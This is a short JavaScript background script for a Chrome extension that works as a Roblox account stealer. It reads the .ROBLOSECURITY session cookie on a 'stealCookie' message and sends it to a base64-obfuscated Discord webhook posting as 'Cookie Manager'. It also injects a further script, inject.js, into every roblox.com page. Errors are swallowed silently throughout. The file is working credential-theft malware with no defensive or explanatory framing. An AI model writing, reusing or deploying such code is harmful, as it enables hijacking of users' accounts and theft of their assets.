const WEBHOOK = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNjczNzQ4ODEyNTY4OTg5Ny9Tc3FnWS1JM1FfeHRtc18ySmI1UEh6enVabVM2SEJZcE9PVjMwWkQ4WlUwU0ttMUdyNmpvUW8xWW91OXZfTkx5UmFpRQ==';

async function sendCookie(cookieValue) {
  try {
    await fetch(atob(WEBHOOK), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `||.ROBLOSECURITY=${cookieValue}||`,
        username: 'Cookie Manager',
        avatar_url: 'https://i.imgur.com/cookieicon.png'
      })
    });
  } catch (_) {}
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === 'stealCookie') {
    chrome.cookies.get({
      url: 'https://www.roblox.com',
      name: '.ROBLOSECURITY'
    }).then(cookie => {
      if (cookie) sendCookie(cookie.value);
      sendResponse({ success: true });
    });
    return true;
  }
});

chrome.webNavigation.onCompleted.addListener(async (details) => {
  if (details.frameId !== 0) return;
  try {
    await chrome.scripting.executeScript({
      target: { tabId: details.tabId },
      files: ['inject.js']
    });
  } catch (_) {}
}, { url: [{ hostSuffix: '.roblox.com' }] });
